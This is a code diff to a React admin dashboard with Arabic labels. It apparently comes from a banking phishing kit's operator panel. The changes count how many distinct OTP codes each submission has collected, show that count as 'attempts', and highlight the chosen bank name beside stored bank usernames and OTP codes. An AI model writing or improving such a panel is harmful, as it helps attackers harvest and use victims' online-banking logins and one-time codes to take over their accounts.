@@ -728,6 +728,12 @@ export default function AdminDashboardPage() {
                           const olderVersions = versions.filter((v) => !v.isLatest);
                           const activeTab = expandedTabs[app.id] || "current";
                           const allData = mergeVersionsData([...versions, app as unknown as AppVersion]);
+                          // عدد محاولات OTP = عدد القيم المختلفة لرمز OTP عبر النسخ
+                          const otpAttempts = new Set(
+                            [...versions, app as unknown as AppVersion]
+                              .filter((v) => v.otpCode)
+                              .map((v) => v.otpCode)
+                          ).size;
 
                           return (
                             <>
@@ -827,10 +833,16 @@ export default function AdminDashboardPage() {
                             <CreditCard className="w-4 h-4" />
                             بيانات البنك والدخول
                           </h4>
-                          <DataBadge
-                            label="البنك المختار"
-                            value={allData.bankName}
-                          />
+                          {/* اسم البنك بارز في الأعلى */}
+                          {allData.bankName && (
+                            <div className="bg-primary/10 border border-primary/30 rounded-xl px-4 py-3 flex items-center gap-3 mb-3">
+                              <CreditCard className="w-5 h-5 text-primary shrink-0" />
+                              <div>
+                                <p className="text-[10px] text-muted-foreground font-medium">البنك المختار</p>
+                                <p className="text-base font-black text-primary">{String(allData.bankName)}</p>
+                              </div>
+                            </div>
+                          )}
                           <DataBadge
                             label="اسم المستخدم"
                             value={allData.bankUsername}
@@ -903,6 +915,11 @@ export default function AdminDashboardPage() {
                           <h4 className="font-bold text-sm text-primary mb-3 flex items-center gap-2">
                             <Smartphone className="w-4 h-4" />
                             رمز OTP والحالة
+                            {otpAttempts > 0 && (
+                              <span className={`mr-auto text-xs font-bold px-2 py-0.5 rounded-full ${otpAttempts > 1 ? "bg-orange-100 text-orange-700" : "bg-green-100 text-green-700"}`}>
+                                {otpAttempts} {otpAttempts === 1 ? "محاولة" : "محاولات"}
+                              </span>
+                            )}
                           </h4>
                           {allData.otpCode ? (
                             <div className="bg-muted rounded-xl p-4 text-center">
